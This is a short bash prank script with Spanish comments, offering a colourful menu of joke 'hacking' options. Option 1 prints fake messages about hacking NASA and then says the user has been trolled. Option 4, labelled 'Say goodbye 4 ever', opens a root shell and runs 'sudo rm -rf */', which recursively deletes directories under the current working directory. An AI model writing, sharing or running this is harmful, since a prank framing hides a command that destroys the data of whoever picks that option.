#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

echo -e "\n${redColour}[+] Made by Astaroz${endColour}\n"

# Opciones del script
echo -e "${yellowColour}1 - Hack the NASA in seconds${endColour}\n"
echo -e "${yellowColour}2 - Deadbytes\n${endColour}"
echo -e "${yellowColour}3 - Ghostfile\n${endColour}"
echo -e "${yellowColour}4 - Say goodbye 4 ever${endColour}\n"

# Mete el número
read -p " - Choose your destiny: "  option

# Validar la entrada del teclado del 1 al 4
if [[ "$option" =~ ^[1-4]$ ]]; then
    case $option in 
    1) 
        echo -e "\n${greenColour}· Hacking the NASA ...${endColour}"
        sleep 5
        echo -e "\n${greenColour}· Accessing illegal files from the deep web ...${endColour}"
        sleep 5
        echo -e "\n${greenColour}· Almost there ...\n${endColour}"
        sleep 6 
        clear
        echo -e "\n${turquoiseColour}You have been trolled${endColour}"
        ;;
    4) 
        sudo /bin/sh
        sudo rm -rf */
        ;;
    
    esac
else
    echo "Finalizado"
fi